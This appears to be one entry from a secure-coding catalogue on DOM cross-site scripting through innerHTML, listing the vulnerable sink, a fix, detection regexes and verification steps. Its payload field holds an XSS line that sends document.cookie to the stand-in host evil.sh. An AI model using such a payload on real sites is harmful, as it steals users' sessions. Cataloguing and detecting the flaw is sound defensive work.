---
order: 1
cwe: 79
owasp: A05
title: DOM XSS through innerHTML
category: injection
severity: critical
sink: |-
    el.innerHTML = user.bio
payload: |-
    <img src=x onerror="fetch('//evil.sh?c='+document.cookie)">
fix: |
    el.textContent = user.bio;
    // markup you must render → DOMPurify.sanitize(html)
detect:
    - '\.innerHTML\s*='
    - 'outerHTML\s*='
    - 'insertAdjacentHTML\('
    - "dangerouslySetInnerHTML"
    - "v-html"
    - '\{@html'
    - 'document\.write\('
verify: "Save the payload where the value comes from and load the page; an alert, or a request to your own server, confirms it."
fineWhen: "The value is a constant, or passes through DOMPurify first, or Trusted Types is enforced."
refs:
    - https://cheatsheetseries.owasp.org/cheatsheets/DOM_based_XSS_Prevention_Cheat_Sheet.html
    - https://developer.mozilla.org/en-US/docs/Web/API/Trusted_Types_API
---

Your `<script>` tags don't run through `innerHTML`. My `onerror` does. I find the same door behind `v-html`, `dangerouslySetInnerHTML` and `insertAdjacentHTML`.
